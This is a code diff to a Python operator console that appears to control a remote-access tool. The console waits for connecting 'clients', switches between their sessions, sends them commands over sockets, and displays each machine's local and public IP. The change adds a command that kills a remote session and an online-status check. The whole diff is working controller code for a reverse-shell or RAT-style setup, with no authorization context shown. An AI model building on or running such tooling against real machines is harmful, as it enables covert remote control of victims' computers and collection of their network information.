@@ -2,10 +2,10 @@ from prompt_toolkit import PromptSession
 from prompt_toolkit.history import InMemoryHistory
 from prompt_toolkit.completion import WordCompleter
 from src.ui.colors import Colors as cl
-from src.utils.client_handler import get_client_by_id, list_clients, clients, handle_client
+from src.utils.client_handler import get_client_by_id, list_clients, clients, handle_client, remove_client
 from src.ui.help import show_main_help, show_client_help
 from src.utils.net_io import recv, send
-from src.modules.get_ip import print_ip
+import json
 
 
 
@@ -32,12 +32,21 @@ def main_loop(sock):
                 print(f"{cl.yellow}[*] Waiting for a client to connect...{cl.reset}")
                 handle_client(sock)
 
+            elif cmd.startswith("sessions kill "):
+                choice = cmd[14:].strip()
+                cl_info = get_client_by_id(clients, choice)
+                send(cl_info['socket'],"kill")
+                remove_client(choice)
+
             elif cmd.startswith("sessions "):
                 choice = cmd[8:].strip()
                 cl_info = get_client_by_id(clients, choice)
-                print(f"{cl.cyan}[+] Switching to client {cmd}{cl.reset}")
-                client_loop(cl_info)
-
+                if cl_info['status'] == "online":
+                    print(f"{cl.cyan}[+] Switching to client {cmd}{cl.reset}")
+                    client_loop(cl_info)
+                else:
+                    raise Exception("The client is offline")
+            
             elif cmd.strip() == "sessions":
                 list_clients(clients) 
 
@@ -78,12 +87,9 @@ def client_loop(client_info):
                 send(client_info['socket'], cmd)
                 data = recv(client_info['socket'])
                 if data:
-                    print_ip(data)
-                
-            elif cmd == "kill":
-                send(client_info['socket'], cmd)
-                print(f"{cl.blue}[-] Killing the session with the client{cl.reset}")
-                break
+                    ip_info = json.loads(data.decode())
+                    print(f"{cl.purple}Local IP:{cl.reset}\t {ip_info.get('lip', 'unknown')}")
+                    print(f"{cl.purple}Public IP:{cl.reset}\t {ip_info.get('pip', 'unknown')}")
 
             elif cmd == "back":
                 print(f"{cl.blue}[+] Returning to main session{cl.reset}")
